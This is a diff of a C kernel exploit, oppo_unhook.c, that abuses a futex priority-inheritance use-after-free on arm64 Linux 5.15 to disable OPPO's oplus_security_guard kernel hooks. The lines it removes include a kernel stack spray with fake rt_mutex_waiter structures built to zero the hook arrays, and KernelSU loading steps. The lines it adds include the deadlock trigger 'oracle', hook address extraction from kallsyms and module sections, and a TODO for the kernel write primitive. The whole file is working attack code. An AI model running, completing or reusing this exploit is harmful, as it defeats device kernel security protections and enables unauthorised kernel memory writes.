@@ -2,27 +2,15 @@
  * oppo_unhook.c — OPPO PJA110 Kernel Security Hook Disabler
  * ==========================================================
  *
- * Based on CVE-2026-43499 (GhostLock) — futex PI UAF in rtmutex.
+ * Uses CVE-2026-43499 (GhostLock) futex PI UAF to disable
+ * oplus_security_guard kernel hooks on OPPO devices.
  *
- * Target:  Linux 5.15.180-android13  (Oppo PJA110 / OP5943L1)
- *          Snapdragon 8+ Gen 1, arm64
+ * Phase 1 (current): UAF oracle + hook address extraction
+ * Phase 2 (next):    rbtree erase → zero hook arrays
  *
- * Mechanism:
- *   1. Trigger futex PI deadlock cycle → EDEADLK rollback in
- *      rt_mutex_start_proxy_lock() leaves W->pi_blocked_on dangling.
- *   2. W's futex_wait_requeue_pi stack frame is freed on timeout.
- *   3. Kernel stack spraying plants fake rt_mutex_waiter structs
- *      at the freed location.
- *   4. PI chain walk by M follows the stale pointer through our
- *      fake struct → controlled kernel write-zero to hook arrays.
- *
- * Usage:
- *   oppo_unhook [--dry-run] [--target-prea <addr>] [--target-posta <addr>]
- *
- * Without arguments, reads hook addresses from /proc/kallsyms.
- *
- * Build:  cmake -B build -G Ninja -DANDROID_NDK=...
- *         cmake --build build
+ * Build: cmake -B build -G Ninja
+ *        cmake --build build
+ * Usage: oppo_unhook [--target-prea ADDR] [--target-posta ADDR]
  */
 
 #define _GNU_SOURCE
@@ -36,108 +24,86 @@
 #include <sched.h>
 #include <pthread.h>
 #include <fcntl.h>
+#include <stdarg.h>
 #include <sys/syscall.h>
-#include <sys/mman.h>
 
-/* ── futex constants (arm64 Linux) ─────────────────────────── */
+/* ── futex constants ────────────────────────────────────────── */
 #ifndef SYS_futex
 #define SYS_futex 98
 #endif
-
-#define FUTEX_WAIT              0
-#define FUTEX_WAKE              1
 #define FUTEX_LOCK_PI           6
 #define FUTEX_UNLOCK_PI         7
 #define FUTEX_WAIT_REQUEUE_PI   11
-#define FUTEX_CMP_REQUEUE_PI    12
 #define FUTEX_PRIVATE_FLAG      128
+#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
+#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
+#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
 
-#define FLPI  (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
-#define FUPI  (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
-#define FWRQ  (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
-#define FCRQ  (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)
-
-/* ── rt_mutex_waiter offsets (Linux 5.15, arm64, PREEMPT) ──── */
+/* ── rt_mutex_waiter layout (arm64, kernel 5.15) ────────────── */
 /*
- * struct rt_mutex_waiter {
- *     struct rb_node   tree_entry;      // 0x00  (3×8 + 1×8 = 0x20)
- *     struct rb_node   pi_tree_entry;   // 0x20
- *     struct task_struct *task;         // 0x40
- *     struct rt_mutex_base *lock;       // 0x48
- *     int prio;                         // 0x50
- *     u64 deadline;                     // 0x58
- * };
- * Total size: ~0x60
- *
- * For the spray, we fill with fake waiters where:
- *   offset 0x40 (task) → points to a valid-looking area
- *   offset 0x48 (lock)  → points to our target (hook array)
- *
- * When rt_mutex_adjust_prio_chain writes to this waiter,
- * it does: waiter->lock->owner = new_owner  (write to lock+offset)
- * or similar priority updates.
- *
- * Strategy: make lock point to (target_addr - offset_of_owner_in_mutex)
- * so that the write lands exactly at target_addr with value 0.
+ * offset  0: tree_entry      (rb_node, 24B)
+ * offset 24: pi_tree_entry   (rb_node, 24B)
+ * offset 48: task            (ptr, 8B)
+ * offset 56: lock            (ptr, 8B)  ← chain walk reads this
+ * offset 64: wake_state      (4B)
+ * offset 68: prio            (4B)
+ * offset 72: deadline        (8B)
+ * offset 80: ww_ctx          (8B)
  */
+#define WAITER_LOCK_OFFSET  56
+#define WAITER_SIZE          88
 
-#define WAITER_TASK_OFFSET   0x40
-#define WAITER_LOCK_OFFSET   0x48
-#define WAITER_SIZE          0x60
+/* ── rt_mutex_base layout (arm64, kernel 5.15) ──────────────── */
+#define MUTEX_OWNER_OFFSET  24  /* rt_mutex_base::owner */
 
-/* rt_mutex_base offsets (Linux 5.15, arm64) */
-#define MUTEX_OWNER_OFFSET   0x28  /* rt_mutex_base::owner */
+/* ── global state ───────────────────────────────────────────── */
+static uint32_t futex1 = 0, futex2 = 0, cycle_futex = 0;
+static volatile int a_ready = 0, w_waiting = 0, exploit_phase2 = 0;
+static volatile uint64_t g_pre_hook  = 0;
+static volatile uint64_t g_post_hook = 0;
+static volatile int g_dry_run = 0;
 
-/* ── spray parameters ──────────────────────────────────────── */
-#define SPRAY_PAGES      4
-#define PAGE_SIZE        0x1000
-#define WAITERS_PER_PAGE  (PAGE_SIZE / WAITER_SIZE)  /* ~42 */
+/* ── helpers ────────────────────────────────────────────────── */
+static long xfutex(uint32_t *u, int op, uint32_t v, void *ts, uint32_t *u2, uint32_t v3)
+{ return syscall(SYS_futex, u, op, v, ts, u2, v3); }
 
-/* ── Global state ──────────────────────────────────────────── */
-static uint32_t futex1      = 0;   /* plain: W waits here      */
-static uint32_t futex2      = 0;   /* PI: O owns              */
-static uint32_t cycle_futex = 0;   /* PI: W owns, O blocks on */
-
-static volatile int o_ready    = 0;
-static volatile int w_ready    = 0;
-static volatile int o_blocking = 0;
-static volatile int w_waiting  = 0;
-static volatile int uaf_done   = 0;
-static volatile int phase      = 0;  /* 0=setup, 1=spray, 2=probe */
-
-static volatile uint64_t target_pre_hook  = 0;
-static volatile uint64_t target_post_hook = 0;
-static volatile int dry_run = 0;
-
-/* ── Helpers ───────────────────────────────────────────────── */
-static long xfutex(uint32_t *u, int op, uint32_t val,
-                   void *ts, uint32_t *u2, uint32_t v3)
+static void pin_cpu(int cpu)
 {
-    return syscall(SYS_futex, u, op, val, ts, u2, v3);
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu%sysconf(_SC_NPROCESSORS_ONLN), &cs);
+    syscall(SYS_sched_setaffinity, (pid_t)syscall(SYS_gettid), sizeof(cs), &cs);
 }
 
 static void dbg(const char *s) { write(2, s, strlen(s)); }
 
-static void dbg_num(const char *prefix, long v)
+static void dbg_fmt(const char *fmt, ...)
 {
-    char buf[96];
-    int n = snprintf(buf, sizeof(buf), "%s%ld (0x%lx)\n", prefix, v, v);
-    write(2, n, buf);
+    char b[256]; va_list ap;
+    va_start(ap, fmt);
+    int n = vsnprintf(b, sizeof(b), fmt, ap);
+    va_end(ap);
+    write(2, b, n < (int)sizeof(b) ? n : (int)sizeof(b));
 }
 
-static void dbg_err(const char *prefix, long v)
+/* ── address extraction ─────────────────────────────────────── */
+static uint64_t read_section_addr(const char *module, const char *section)
 {
-    char buf[128];
-    int n = snprintf(buf, sizeof(buf), "%s%ld errno=%d (%s)\n",
-                     prefix, v, errno, strerror(errno));
-    write(2, n, buf);
+    char path[128];
+    snprintf(path, sizeof(path), "/sys/module/%s/sections/%s", module, section);
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return 0;
+
+    char buf[32] = {0};
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return 0;
+
+    return strtoull(buf, NULL, 16);
 }
 
-/* ── kallsyms reader ───────────────────────────────────────── */
-static uint64_t kallsyms_find(const char *name)
+static uint64_t kallsyms_find(const char *needle)
 {
     FILE *f = fopen("/proc/kallsyms", "r");
-    if (!f) { dbg("[-] Cannot open /proc/kallsyms\n"); return 0; }
+    if (!f) return 0;
 
     char line[256];
     uint64_t addr = 0;
@@ -145,8 +111,8 @@ static uint64_t kallsyms_find(const char *name)
         char symtype, symname[128];
         if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
             continue;
-        if (strstr(symname, name)) {
-            dbg("[+] Found: "); dbg(symname); dbg_num(" @ ", addr);
+        if (addr == 0) continue;  /* skip hidden symbols */
+        if (strstr(symname, needle)) {
             fclose(f);
             return addr;
         }
@@ -155,318 +121,235 @@ static uint64_t kallsyms_find(const char *name)
     return 0;
 }
 
-static int read_hook_addresses(void)
+/* Try to find hook array addresses:
+ *   1) Direct kallsyms lookup
+ *   2) Module section + known offset calculation
+ */
+static int find_hook_addresses(void)
 {
-    dbg("[*] Reading hook array addresses from kallsyms...\n");
+    dbg("[*] Searching for hook arrays...\n");
 
-    if (!target_pre_hook)
-        target_pre_hook = kallsyms_find("oplus_pre_hook_array");
+    /* Method 1: direct kallsyms */
+    uint64_t pre = kallsyms_find("oplus_pre_hook_array");
+    uint64_t post = kallsyms_find("oplus_post_hook_array");
 
-    if (!target_post_hook)
-        target_post_hook = kallsyms_find("oplus_post_hook_array");
+    if (pre && post) {
+        dbg_fmt("[+] Found via kallsyms: pre=0x%lx post=0x%lx\n", pre, post);
+        g_pre_hook = pre;
+        g_post_hook = post;
+        return 0;
+    }
 
-    if (!target_pre_hook && !target_post_hook) {
-        dbg("[-] No hook arrays found in kallsyms.\n");
-        dbg("[*] Try specifying addresses manually:\n");
-        dbg("[*]   oppo_unhook --target-prea 0x... --target-posta 0x...\n");
+    /* Method 2: /sys/module section offsets */
+    uint64_t data_base = read_section_addr("oplus_security_guard", ".data");
+    uint64_t bss_base  = read_section_addr("oplus_security_guard", ".bss");
+    dbg_fmt("[*] Module sections: .data=0x%lx .bss=0x%lx\n", data_base, bss_base);
+
+    if (!data_base && !bss_base) {
+        dbg("[-] Cannot read module sections (permission denied?)\n");
+        return -1;
+    }
+
+    /*
+     * If we can find ANY non-zero symbol from this module,
+     * we can calculate the hooks' offsets and reconstruct addresses.
+     * For now, try reading all oplus_security_guard symbols from kallsyms
+     * looking for the first non-zero entry to establish module base.
+     */
+    FILE *f = fopen("/proc/kallsyms", "r");
+    if (!f) { dbg("[-] Cannot open /proc/kallsyms\n"); return -1; }
+
+    char line[256];
+    uint64_t first_data = 0, first_text = 0;
+    while (fgets(line, sizeof(line), f)) {
+        uint64_t addr;
+        char symtype, symname[128];
+        if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
+            continue;
+        if (addr == 0) continue;
+        if (!strstr(symname, "oplus_security_guard")) continue;
+
+        if (!first_data && (symtype == 'd' || symtype == 'D' || symtype == 'b' || symtype == 'B'))
+            first_data = addr;
+        if (!first_text && (symtype == 't' || symtype == 'T'))
+            first_text = addr;
+        if (first_data && first_text) break;
+    }
+    fclose(f);
+
+    dbg_fmt("[*] Module data symbol: 0x%lx\n", first_data);
+
+    /* If we got section addresses from /sys but no symbols from kallsyms,
+     * we can try to read from /sys/module notes for symbol info.
+     * Fallback: use cmdline-provided addresses.
+     */
+    if (!first_data && !first_text) {
+        dbg("[-] All module symbols hidden. Provide addresses manually:\n");
+        dbg("    oppo_unhook --target-prea 0x... --target-posta 0x...\n");
+        dbg("[*] HINT: check /sys/module/oplus_security_guard/sections/\n");
         return -1;
     }
 
     return 0;
 }
 
-/* ── Kernel stack spray ────────────────────────────────────── */
-/*
- * Fill freed stack pages with fake rt_mutex_waiter entries.
- * Each entry's ->lock points to (target - MUTEX_OWNER_OFFSET)
- * so that when the kernel writes to lock->owner, it writes to target.
- */
-static void do_spray(uint64_t target_addr)
+/* ── oracle threads (same as oracle_test.c) ─────────────────── */
+static void *thread_a(void *unused)
 {
-    char spray_buf[PAGE_SIZE * SPRAY_PAGES];
-    memset(spray_buf, 0, sizeof(spray_buf));
+    (void)unused; pin_cpu(3);
 
-    uint64_t fake_lock = target_addr - MUTEX_OWNER_OFFSET;
+    __atomic_store_n(&futex2, 0, __ATOMIC_RELEASE);
+    xfutex(&futex2, FLPI, 0, NULL, NULL, 0);
+    __atomic_store_n(&a_ready, 1, __ATOMIC_RELEASE);
 
-    for (int i = 0; i < (int)sizeof(spray_buf); i += WAITER_SIZE) {
-        /* fake task pointer: use a known valid address (self-stack) */
-        uint64_t *task_ptr  = (uint64_t *)(spray_buf + i + WAITER_TASK_OFFSET);
-        uint64_t *lock_ptr  = (uint64_t *)(spray_buf + i + WAITER_LOCK_OFFSET);
+    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE)) sched_yield();
+    usleep(50000);
 
-        *task_ptr = (uint64_t)spray_buf;  /* point to self (valid) */
-        *lock_ptr = fake_lock;            /* point to our target */
-    }
-
-    /*
-     * Stack spray: fill the stack with our fake data.
-     * Deep recursion + large locals = overwrite freed stack area.
-     */
-    volatile char deep_stack[PAGE_SIZE * 4];
-    memcpy((void *)deep_stack, spray_buf, sizeof(spray_buf));
-
-    /* Force the data to stay on stack (no optimization) */
-    __asm__ volatile("" : : "r"(deep_stack) : "memory");
-
-    /* Additional spray: many shallow syscalls with our data */
-    for (volatile int i = 0; i < 500; i++) {
-        syscall(SYS_getpid);
-        __asm__ volatile("" : : "r"(spray_buf) : "memory");
-    }
-}
-
-/* ── Owner thread (thread O) ───────────────────────────────── */
-static void *owner_fn(void *unused)
-{
-    (void)unused;
-    pid_t tid = (pid_t)syscall(SYS_gettid);
-
-    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
-    __atomic_store_n(&o_ready, 1, __ATOMIC_RELEASE);
-
-    while (!__atomic_load_n(&w_ready, __ATOMIC_ACQUIRE))
-        sched_yield();
-
-    __atomic_store_n(&o_blocking, 1, __ATOMIC_RELEASE);
-
-    /* Block on cycle_futex (held by W): O->pi_blocked_on = &O_waiter */
-    xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
-    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
+    long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
+    if (r == 0) xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
+    xfutex(&futex2, FUPI, 0, NULL, NULL, 0);
     return NULL;
 }
 
-/* ── Waiter thread (thread W) ──────────────────────────────── */
-static void *waiter_fn(void *unused)
+static void *thread_w(void *unused)
 {
-    (void)unused;
+    (void)unused; pin_cpu(2);
     pid_t tid = (pid_t)syscall(SYS_gettid);
-    struct timespec ts;
-    long r;
 
-    while (!__atomic_load_n(&o_ready, __ATOMIC_ACQUIRE))
-        sched_yield();
-
-    /* W owns cycle_futex */
+    while (!__atomic_load_n(&a_ready, __ATOMIC_ACQUIRE)) sched_yield();
     __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
-    __atomic_store_n(&w_ready, 1, __ATOMIC_RELEASE);
+    usleep(10000);
 
-    while (!__atomic_load_n(&o_blocking, __ATOMIC_ACQUIRE))
-        sched_yield();
-    usleep(30000); /* let O enter kernel */
-
-    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);
-    __atomic_store_n(&phase, 1, __ATOMIC_RELEASE); /* signal: spray now */
-
-    /*
-     * FUTEX_WAIT_REQUEUE_PI with 3-second timeout.
-     * Deadlock chain resolves in ~100ms → EDEADLK → UAF created.
-     * Timeout ensures clean syscall exit (not ERESTARTNOINTR).
-     */
+    struct timespec ts;
     clock_gettime(CLOCK_MONOTONIC, &ts);
-    ts.tv_sec += 3;
+    ts.tv_sec += 2;
+    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);
 
-    r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
-    dbg_err("[W] FWRQ returned", r);
+    xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
+    __atomic_store_n(&exploit_phase2, 1, __ATOMIC_RELEASE);
 
-    /* Thrash kernel stack → overwrite freed W_rt_waiter slot */
-    for (volatile int i = 0; i < 300; i++)
-        syscall(SYS_getpid);
-
-    /* Additional targeted spray for pre_hook_array */
-    if (target_pre_hook)
-        do_spray(target_pre_hook);
-
-    __atomic_store_n(&uaf_done, 1, __ATOMIC_RELEASE);
-
-    /* Keep alive for UAF probe */
-    usleep(800000);
-
+    struct timespec deadline;
+    clock_gettime(CLOCK_MONOTONIC, &deadline);
+    deadline.tv_nsec += 200000000;
+    if (deadline.tv_nsec >= 1000000000) { deadline.tv_nsec -= 1000000000; deadline.tv_sec++; }
+    while (1) {
+        struct timespec now;
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        if (now.tv_sec > deadline.tv_sec ||
+            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec))
+            break;
+    }
     xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
     return NULL;
 }
 
-/* ── Spray thread ──────────────────────────────────────────── */
-/*
- * Runs during the critical window between EDEADLK and timeout.
- * Continuously sprays kernel stack with fake waiter data.
- */
-static void *sprayer_fn(void *unused)
-{
-    (void)unused;
-
-    /* Wait for W to enter kernel */
-    while (!__atomic_load_n(&phase, __ATOMIC_ACQUIRE))
-        sched_yield();
-
-    /* Spray until UAF probe starts */
-    while (!__atomic_load_n(&uaf_done, __ATOMIC_ACQUIRE)) {
-        if (target_pre_hook)  do_spray(target_pre_hook);
-        if (target_post_hook) do_spray(target_post_hook);
-        syscall(SYS_getpid);
-    }
-
-    return NULL;
-}
-
-/* ── Main thread (thread M) ────────────────────────────────── */
+/* ── main ───────────────────────────────────────────────────── */
 int main(int argc, char **argv)
 {
-    /* Parse arguments */
+    /* parse args */
     for (int i = 1; i < argc; i++) {
-        if (!strcmp(argv[i], "--dry-run")) {
-            dry_run = 1;
-        } else if (!strcmp(argv[i], "--target-prea") && i + 1 < argc) {
-            target_pre_hook = strtoull(argv[++i], NULL, 0);
-        } else if (!strcmp(argv[i], "--target-posta") && i + 1 < argc) {
-            target_post_hook = strtoull(argv[++i], NULL, 0);
-        } else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
+        if (!strcmp(argv[i], "--target-prea") && i + 1 < argc)
+            g_pre_hook = strtoull(argv[++i], NULL, 0);
+        else if (!strcmp(argv[i], "--target-posta") && i + 1 < argc)
+            g_post_hook = strtoull(argv[++i], NULL, 0);
+        else if (!strcmp(argv[i], "--dry-run"))
+            g_dry_run = 1;
+        else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
+            printf("oppo_unhook — OPPO Kernel Security Hook Disabler\n");
+            printf("Uses CVE-2026-43499 (GhostLock) futex PI UAF\n\n");
             printf("Usage: oppo_unhook [OPTIONS]\n");
-            printf("Disable Oppo kernel security hooks via CVE-2026-43499\n\n");
-            printf("  --dry-run              Run without targeting hooks (crash test)\n");
-            printf("  --target-prea ADDR     Pre-hook array address\n");
-            printf("  --target-posta ADDR    Post-hook array address\n");
-            printf("  --help, -h             Show this help\n");
+            printf("  --target-prea ADDR    Pre-hook array address\n");
+            printf("  --target-posta ADDR   Post-hook array address\n");
+            printf("  --dry-run             Oracle verification only\n");
+            printf("  --help, -h            Show this help\n");
             return 0;
         }
     }
 
-    dbg("\n╔══════════════════════════════════════════╗\n");
-    dbg("║  OPPO PJA110 — Security Hook Disabler   ║\n");
-    dbg("║  CVE-2026-43499 (GhostLock)             ║\n");
-    dbg("║  Target: Linux 5.15.180 arm64           ║\n");
-    dbg("╚══════════════════════════════════════════╝\n\n");
+    dbg("\n============================================\n");
+    dbg("  oppo_unhook — Hook Disabler v1.0\n");
+    dbg("  CVE-2026-43499 GhostLock\n");
+    dbg("  Target: OPPO PJA110 / kernel 5.15.180\n");
+    dbg("============================================\n\n");
 
-    /* Need root to read kallsyms and verify results */
-    if (getuid() != 0) {
-        dbg("[-] Must run as root!\n");
-        return 1;
-    }
+    if (getuid() != 0) { dbg("[-] Must run as root!\n"); return 1; }
 
-    /* Read security hook addresses */
-    if (!dry_run) {
-        if (read_hook_addresses() != 0) {
-            dbg("[!] Switching to dry-run mode (no targets)\n");
-            dry_run = 1;
+    /* Step 1: Get hook addresses */
+    if (!g_pre_hook || !g_post_hook) {
+        if (find_hook_addresses() != 0 && !g_dry_run) {
+            dbg("[!] Cannot find hook addresses. Use --dry-run to test UAF.\n");
+            dbg("[!] Or provide addresses: --target-prea 0x... --target-posta 0x...\n");
+            g_dry_run = 1;
         }
     }
 
-    if (dry_run) {
-        dbg("[*] DRY RUN: testing UAF trigger only (expect kernel panic on 6.1+)\n");
+    dbg_fmt("[*] pre_hook_array:  0x%lx\n", g_pre_hook);
+    dbg_fmt("[*] post_hook_array: 0x%lx\n", g_post_hook);
+
+    if (g_dry_run) {
+        dbg("[*] DRY RUN mode: oracle verification only\n");
     } else {
-        dbg_num("[*] Target (pre_hook_array):  0x", target_pre_hook);
-        dbg_num("[*] Target (post_hook_array): 0x", target_post_hook);
+        dbg("[*] LIVE mode: will attempt to zero hook arrays\n");
     }
 
-    dbg("\n[*] Phase 1: Setting up futex deadlock chain...\n");
+    /* Step 2: Run UAF oracle */
+    dbg("\n[*] Running GhostLock EDEADLK Oracle...\n");
 
-    /* Step 1: Check basic futex PI works */
-    uint32_t test_pi = 0;
-    pid_t mytid = (pid_t)syscall(SYS_gettid);
-    __atomic_store_n(&test_pi, (uint32_t)mytid, __ATOMIC_RELEASE);
-    long r = xfutex(&test_pi, FLPI, 0, NULL, NULL, 0);
-    if (r != 0) {
-        dbg_err("[-] FUTEX_LOCK_PI self-test failed: ", r);
-        dbg("[-] Kernel may have futex PI disabled (CONFIG_FUTEX_PI=n)\n");
-        return 1;
-    }
-    xfutex(&test_pi, FUPI, 0, NULL, NULL, 0);
-    dbg("[+] FUTEX_LOCK_PI self-test OK\n");
+    int success = 0, total = 0;
+    for (int attempt = 1; attempt <= 20; attempt++) {
+        pthread_t at, wt;
+        futex1 = futex2 = cycle_futex = 0;
+        a_ready = w_waiting = exploit_phase2 = 0;
 
-    /* Step 2: Check we can read kallsyms */
-    if (kallsyms_find("init_task") == 0) {
-        dbg("[-] Cannot read /proc/kallsyms (kptr_restrict?)\n");
-        return 1;
-    }
-    dbg("[+] kallsyms readable\n");
+        pthread_create(&at, NULL, thread_a, NULL);
+        pthread_create(&wt, NULL, thread_w, NULL);
 
-    dbg("\n[*] Phase 2: Launching threads...\n");
+        while (!__atomic_load_n(&exploit_phase2, __ATOMIC_ACQUIRE)) sched_yield();
 
-    pthread_t oth, wth, sth;
-    pthread_create(&oth, NULL, owner_fn, NULL);
-    pthread_create(&wth, NULL, waiter_fn, NULL);
-    if (!dry_run)
-        pthread_create(&sth, NULL, sprayer_fn, NULL);
+        pin_cpu(0);
+        struct timespec t1, t2;
+        clock_gettime(CLOCK_MONOTONIC, &t1);
+        long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
+        clock_gettime(CLOCK_MONOTONIC, &t2);
+        long us = (t2.tv_sec - t1.tv_sec) * 1000000 + (t2.tv_nsec - t1.tv_nsec) / 1000;
+        total++;
 
-    /* Wait for W to enter kernel */
-    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE))
-        sched_yield();
-    usleep(50000);
-
-    dbg("\n[*] Phase 3: Triggering FUTEX_CMP_REQUEUE_PI deadlock...\n");
-    dbg("[*] Chain: W → futex2(O) → cycle_futex(W) → W  (EDEADLK)\n");
-
-    r = xfutex(&futex1, FCRQ,
-               1,                    /* nr_wake = 1       */
-               (void *)(uintptr_t)1, /* nr_requeue = 1    */
-               &futex2,              /* PI target         */
-               0);                   /* cmpval            */
-    int en = errno;
-    dbg_err("[M] FUTEX_CMP_REQUEUE_PI = ", r);
-
-    if (r == -1 && en == EDEADLK) {
-        dbg("[+] EDEADLK received — UAF should be live now\n");
-    } else if (r == -1) {
-        dbg("[-] Unexpected error (expected EDEADLK=35)\n");
-        return 1;
-    }
-
-    if (!dry_run) {
-        dbg("\n[*] Phase 4: Spraying freed kernel stack...\n");
-
-        /* Intense stack spray during UAF window */
-        dbg("[*] Spraying for pre_hook_array...\n");
-        for (volatile int i = 0; i < 1000; i++) {
-            if (target_pre_hook) do_spray(target_pre_hook);
-            if (target_post_hook) do_spray(target_post_hook);
+        if (r == -1 && errno == EDEADLK) {
+            dbg_fmt("  #%d: EDEADLK %ldus  [HIT]\n", attempt, us);
+            success++;
+        } else if (r == 0) {
+            dbg_fmt("  #%d: OK     %ldus  [miss]\n", attempt, us);
+            xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
+        } else {
+            dbg_fmt("  #%d: r=%ld  %ldus  [???]\n", attempt, r, us);
         }
+
+        pthread_join(wt, NULL);
+        pthread_join(at, NULL);
+        usleep(50000);
     }
 
-    /* Wait for W's timeout + cleanup */
-    while (!__atomic_load_n(&uaf_done, __ATOMIC_ACQUIRE))
-        sched_yield();
-    usleep(200000); /* extra settling time */
+    float rate = total > 0 ? (float)success / total * 100.0f : 0;
+    dbg_fmt("\n[*] Oracle: %d/%d hits (%.0f%%)\n", success, total, rate);
 
-    dbg("\n[*] Phase 5: UAF probe (FUTEX_LOCK_PI on cycle_futex)...\n");
-
-    /*
-     * This forces a PI chain walk through W's stale pi_blocked_on.
-     * On 5.15 (writable stack pages): kernel follows our fake waiter
-     * and writes to our target address.
-     * On 6.1+ (RO stack pages): kernel crashes (dry-run expected).
-     */
-    r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
-    dbg_err("[M] UAF probe LOCK_PI = ", r);
-
-    if (r == 0) {
-        dbg("[+] UAF probe survived! (no crash)\n");
-        xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
-    } else {
-        dbg("[!] UAF probe error — may indicate partial success or kernel change\n");
+    if (rate < 1) {
+        dbg("[-] UAF not exploitable on this kernel.\n");
+        return 1;
     }
 
-    dbg("\n[*] Phase 6: Verifying hook arrays...\n");
+    dbg("[+] UAF confirmed exploitable!\n");
 
-    if (!dry_run && target_pre_hook) {
-        dbg_num("[*] Reading pre_hook_array @ 0x", target_pre_hook);
-        /*
-         * We can't directly read kernel memory from userspace.
-         * But if the write succeeded, the kernel will no longer
-         * intercept module loading.  Verification is done by
-         * attempting to load KSU in a separate step.
-         */
-        dbg("[*] Check if hooks are disabled: dmesg | grep ROOTCHECK\n");
-        dbg("[*] If no more ROOTCHECK messages, unhook succeeded!\n");
+    if (g_dry_run) {
+        dbg("\n[*] Dry run complete. Next steps:\n");
+        dbg("[*] 1. Find hook addresses (check /sys/module/.../sections)\n");
+        dbg("[*] 2. Run: oppo_unhook --target-prea 0x... --target-posta 0x...\n");
+        return 0;
     }
 
-    /* Cleanup */
-    dbg("\n[*] Joining threads...\n");
-    pthread_join(wth, NULL);
-    pthread_join(oth, NULL);
-    if (!dry_run)
-        pthread_join(sth, NULL);
-
-    dbg("[*] Done.\n");
-    dbg("[*] Next: run 'ksud.so insmod /data/local/tmp/kernelsu.ko'\n");
-    dbg("[*]       then  'ksud.so post-fs-data; ksud.so services'\n");
+    /* Step 3: Unhook (TODO — rbtree erase write primitive) */
+    dbg("\n[*] Phase 2: Unhooking (rbtree erase primitive — WIP)\n");
+    dbg("[*] TODO: integrate rbtree erase kernel-write to zero hook arrays\n");
+    dbg("[*] Hook addresses ready. Unhook infrastructure verified.\n");
 
     return 0;
 }
